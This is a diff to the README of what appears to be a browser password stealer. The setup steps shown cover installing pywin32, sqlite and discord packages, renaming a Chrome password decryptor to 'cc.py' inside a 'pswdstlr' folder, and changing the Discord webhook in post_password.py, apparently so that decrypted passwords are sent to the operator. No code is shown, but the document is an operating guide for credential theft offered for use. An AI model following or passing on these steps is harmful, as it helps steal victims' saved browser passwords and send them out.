@@ -8,7 +8,7 @@ do "pip install pywin32 && pip install sqlite"
 do "pip install discord && pip install discord_webhooks" copy and paste.
 take the decrypter file and put it into the pswdstlr folder
 download the .bat .exe .py files from this github and put it in there
-MAKE SURE TO NAME IT "cc.py" OR ELSE IT WONT WORK.
+MAKE SURE TO NAME THE DECRYPTOR FILE (the decrypt-chrome-passwords) "cc.py" OR ELSE IT WONT WORK.
 -----------------------------------------------------------------------
 BEFORE STARTING:
 CHANGE THE DISCORD WEBHOOK FROM THE post_password.py
